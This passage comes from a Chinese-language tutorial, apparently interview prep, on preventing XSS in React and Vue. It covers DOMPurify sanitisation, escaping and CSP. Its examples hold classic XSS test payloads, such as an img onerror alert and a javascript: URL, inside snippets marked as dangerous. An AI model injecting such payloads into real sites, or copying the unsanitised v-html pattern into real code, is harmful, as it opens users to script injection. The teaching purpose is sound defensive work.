<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><p><strong>6. 使用 TypeScript</strong></p><div class="language-typescript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">typescript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// TypeScript 可以帮助发现类型错误</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">interface</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Props</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">  html</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">  className</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> Component</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> React</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Props</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ({ </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">className</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> }) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  if</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">!</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">html) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">return</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> null</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> className</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">={</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">className</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}&gt;{html}</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;/</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">div</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><p><strong>React Router XSS 防护：</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 使用 useParams 时</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { useParams } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;react-router-dom&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> User</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> () </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> { </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">id</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> } </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> useParams</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">();</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // React 会自动转义 id</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;User ID: {id}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 安全</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><p><strong>最佳实践：</strong></p><ol><li><p><strong>避免使用 dangerouslySetInnerHTML</strong></p><ul><li>除非绝对必要</li><li>总是使用 DOMPurify 清理</li></ul></li><li><p><strong>不使用 eval 和 Function</strong></p><ul><li>使用安全的方式实现动态行为</li></ul></li><li><p><strong>验证所有用户输入</strong></p><ul><li>白名单验证</li><li>类型检查</li></ul></li><li><p><strong>使用 TypeScript</strong></p><ul><li>类型安全</li><li>减少运行时错误</li></ul></li><li><p><strong>配置 CSP</strong></p><ul><li>限制脚本来源</li><li>防止内联脚本执行</li></ul></li><li><p><strong>使用安全库</strong></p><ul><li>dompurify</li><li>sanitize-html</li><li>validator.js</li></ul></li><li><p><strong>定期更新依赖</strong></p><ul><li>修复安全漏洞</li></ul></li><li><p><strong>代码审查</strong></p><ul><li>检查危险的 API 使用</li><li>审查第三方库</li></ul></li></ol><p><strong>示例：安全的数据展示组件</strong></p><div class="language-jsx vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">jsx</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> React </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;react&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">interface</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> SafeHtmlProps</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">  html</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;">  allowedTags</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">?:</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> string</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[];</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> const</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> SafeHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> React</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FC</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">SafeHtmlProps</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ({ </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  html, </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  allowedTags </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;b&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;i&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;em&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;strong&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;p&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">] </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">}) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> config</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    ALLOWED_TAGS: allowedTags,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    KEEP_CONTENT: </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">true</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">setConfig</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(config);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> cleanHtml</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(html);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> dangerouslySetInnerHTML</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{{ __html: cleanHtml }} /&gt;;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span></code></pre></div><hr><h2 id="_28、vue-xss-如何防范和解决" tabindex="-1">28、Vue XSS 如何防范和解决？ <a class="header-anchor" href="#_28、vue-xss-如何防范和解决" aria-label="Permalink to &quot;28、Vue XSS 如何防范和解决？&quot;">​</a></h2><p><strong>Vue XSS 防范：</strong></p><p><strong>Vue 默认的 XSS 防护：</strong></p><p><strong>1. 模板语法自动转义</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- Vue 自动转义 --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;{{ userInput }}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userInput: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 输出: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt; --&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 安全，不会执行脚本 --&gt;</span></span></code></pre></div><p><strong>2. 插值表达式默认转义</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;{{ htmlContent }}&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">p</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><strong>危险的 XSS 场景：</strong></p><p><strong>1. v-html 指令</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- 危险！直接渲染 HTML --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> v-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;userInput&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userInput: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 会执行脚本，不安全 --&gt;</span></span></code></pre></div><p><strong>解决方案：</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- 使用 dompurify 清理 HTML --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> v-html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;sanitizedHtml&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">div</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">from</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;dompurify&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userInput: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;&lt;img src=x onerror=alert(1)&gt;&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  },</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  computed: {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">    sanitizedHtml</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">      return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> DOMPurify.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sanitize</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">this</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.userInput);</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">&lt;!-- 安全 --&gt;</span></span></code></pre></div><p><strong>2. 动态绑定中的 javascript:</strong></p><div class="language-vue vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">vue</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  &lt;!-- 危险！ --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  &lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> :href</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;userUrl&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;点击&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">a</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">template</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">export</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> default</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">  data</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">() {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    return</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> {</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">      userUrl: </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;javascript:alert(1)&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    };</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">  }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">};</span></span>
